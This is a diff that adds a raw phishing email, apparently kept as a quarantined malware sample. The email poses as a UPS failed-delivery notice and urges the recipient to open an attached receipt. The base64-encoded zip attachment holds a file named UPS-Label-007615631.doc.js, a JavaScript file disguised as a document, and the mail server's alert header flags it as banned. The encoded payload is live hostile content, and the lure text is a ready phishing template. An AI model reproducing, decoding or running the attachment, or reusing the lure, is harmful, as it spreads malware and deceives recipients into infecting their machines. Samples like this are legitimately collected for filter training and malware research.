@@ -1,0 +1,87 @@
+Return-Path: <sollectio@shared2.lincoln.netcetra.com>
+Delivered-To: banned-quarantine
+X-Envelope-To: <jcblcofi@jcbl.com>
+X-Envelope-To-Blocked: <jcblcofi@jcbl.com>
+X-Quarantine-ID: <avPPUXQIYDPr>
+X-Amavis-Alert: BANNED, message contains
+	.asc,UPS-Label-007615631/UPS-Label-007615631.doc.js
+X-Spam-Flag: NO
+X-Spam-Score: 0
+X-Spam-Level:
+X-Spam-Status: No, score=x tag=x tag2=x kill=x tests=[] autolearn=unavailable
+Received: from mx10.jcbl.com ([127.0.0.1])
+	by localhost (mx9.jcbl.com [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id avPPUXQIYDPr for <jcblcofi@jcbl.com>;
+	Mon, 10 Jul 2017 05:55:43 +0530 (IST)
+Received: from shared2.lincoln.netcetra.com (shared2.lincoln.netcetra.com [208.77.210.16])
+	by mx10.jcbl.com (Postfix) with ESMTPS id A5BB8FA838C
+	for <jcblcofi@jcbl.com>; Mon, 10 Jul 2017 05:55:40 +0530 (IST)
+Received: from sollectio by shared2.lincoln.netcetra.com with local (Exim 4.89)
+	(envelope-from <sollectio@shared2.lincoln.netcetra.com>)
+	id 1dUMX0-0008KZ-F7
+	for jcblcofi@jcbl.com; Sun, 09 Jul 2017 17:26:30 -0700
+To: jcblcofi@jcbl.com
+Subject: Status of your UPS delivery ID:007615631
+Date: Mon, 10 Jul 2017 00:26:30 +0000
+Content-Type: multipart/mixed;
+	boundary="bound1_9a5b4dcfe0fb6f7d9524cbd96f2f5f16"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1dUMX0-0008KZ-F7@shared2.lincoln.netcetra.com>
+From: sollectio@shared2.lincoln.netcetra.com
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - shared2.lincoln.netcetra.com
+X-AntiAbuse: Original Domain - jcbl.com
+X-AntiAbuse: Originator/Caller UID/GID - [555 556] / [47 12]
+X-AntiAbuse: Sender Address Domain - shared2.lincoln.netcetra.com
+X-Get-Message-Sender-Via: shared2.lincoln.netcetra.com: authenticated_id: sollectio/primary_hostname/system user
+X-Authenticated-Sender: shared2.lincoln.netcetra.com: sollectio
+
+--bound1_9a5b4dcfe0fb6f7d9524cbd96f2f5f16
+Content-Type: text/plain; charset=us-ascii
+
+Dear Customer,
+
+UPS courier was unable to contact you for your parcel delivery.
+
+Download postal receipt attached to e-mail!
+
+Yours sincerely,
+ ,
+UPS Support Manager.
+
+
+--bound1_9a5b4dcfe0fb6f7d9524cbd96f2f5f16
+Content-Type: application/zip; name="UPS-Label-007615631.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=UPS-Label-007615631.zip
+
+UEsDBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATAAAAVVBTLUxhYmVsLTAwNzYxNTYzMQAAAAAAAAAA
+AAAAAFBLAwQUAAAACAAAAAAAGQltCGYEAACtBgAALgAAAFVQUy1MYWJlbC0wMDc2MTU2MzEvVVBT
+LUxhYmVsLTAwNzYxNTYzMS5kb2MuanNtVG1zokgQ/uxW7X/g+LDiYQwqMXip7NWgxBhFfM2abG2l
+AAcY3oYMTFRS+99vQExtqs5CmO5+unum++lxaGxnCMdcjCOaZqaQEJzhjDbeCcwoiblKbhGYhKYN
+hUsALt0mzzdufn/98mYSLodRwN1ydan8tbV45oD+hPZ/rOVerGzsHz5V5t082NtZvkvhWup0lS5D
+6uOxOvbBTHWDVy9Ao/5eUsFCuwPAGICFAgr7wJ2wtQaSvO1sotEOEqX/2PEGw0FvPl+bdhLcrw7h
+m7N8wOHjyNjgfHj1Ak1piIKXZR+l844KLfA6DNZk0QForm8nHWpI2XjUv6MadfF0aw+Gaqh0g7e8
+O1lqJAJksyEAPsrxcrxR5FSj+dwY67OHbn+trFwcPkCT+j/0/pO2u5s83IfGeISfDauXHcCGqjZ5
+VeO8f3932DzGKJ49D3ob3T+kHfwwXAa9NmpHk2SzWkn7WYKSzj65oP7zzA/WPlLzVTScyD1vt1zn
+nms/LgxZXVijQ1cBnZ77svanVMuPNvWwdkU8CS7nRzdydlMQknn25AygM2urV0caXdD8SdbdfmSq
+KwMf02u8fLafrNfr7dsFGVqvR01ycH8xHoIFUNeONlKe9Vf37prIeh4PfODrOlDp9fYx2Y9sw87n
+mqoaz3eOZ3SVi4cE7/WpeXjZrAy7fe8qq75FNwl4TsgVtBb5KNal+s2JG4QeSm7YUJJsx+xcybap
+wHZbvpa7Vv9KMmUIbVmWz/gAEUbFW06q5ANb/+StELut7hHFJt0h3LJxxDf5FJKdDRn5QtQilClC
+MzJj2zNbdkgtJqPYwSl2slYSMsmCmdlKo6C1C/hfVXTftLHFMsRwzwFCzKNQX2qrOZjVm1x9pK2L
+j75ZjYdGsVqCdD6e1huVczktjsncD60Qxm7micWunfM85TSkkZCggMIG915+WymMd0I5OB+wyAyP
+qScwSDVv5znkvQwA9iT8ZweC8sgUAt9tcmGAmF+tcmSqVpqEKBMK/Scfl0CYx/h/stRtTGOWB5L6
+ZxePmQWXhsgyM0wa7/DNDP+QP2EDtMOB4EFCUfRxb5xEdm2kCY7Z2MNDdr4xXO+Ysbr9lREKWcn2
+HgqhUAiNr1/ev36plRhIwoI6h58lJ4qW1ZAjlML326r4DF8rHGoWgWZQQFiGWkaOhb5WKyxFLIcG
+5rnNbMdvcGtYPrQz4aPW+moLgD7ttLb69H4NwHrONxo3tdopRuHfwgmMhZIxP7sXnV9NjufFc/NE
+/p/LS14s9yzWL+viR8HF+r91sbghm+WpC/LUaidqFFFPcnneoiKnQn42BCiKkO0xq5tVRPuwRchx
+yqMxE4p38GA4QjFyjT8QIcUBYhDe5EWeLw3I4QShiitKDe47JyhiW2w3uL+5tiRx375xHe72lr3Y
+qsohcl2G6zS4IkBZ89O2acretxUr3axZjnyj5WMUC1Xy025qFaMYvlJ8NK3sWvG3zcz2BHhu6+/C
+WHZcFNny981/GQltCGYEAACtBgAAUEsBAgAACgAAAAAAAAAAAAAAAAAAAAAAAAAAABMAAAAAAAAA
+AAAQAAAAAAAAAFVQUy1MYWJlbC0wMDc2MTU2MzFQSwECAAAUAAAACAAAAAAAGQltCGYEAACtBgAA
+LgAAAAAAAAAAACAAAAA9AAAAVVBTLUxhYmVsLTAwNzYxNTYzMS9VUFMtTGFiZWwtMDA3NjE1NjMx
+LmRvYy5qc1BLBQYAAAAAAgACAJ0AAAD7BAAAAAA=
+
+
+--bound1_9a5b4dcfe0fb6f7d9524cbd96f2f5f16--
+
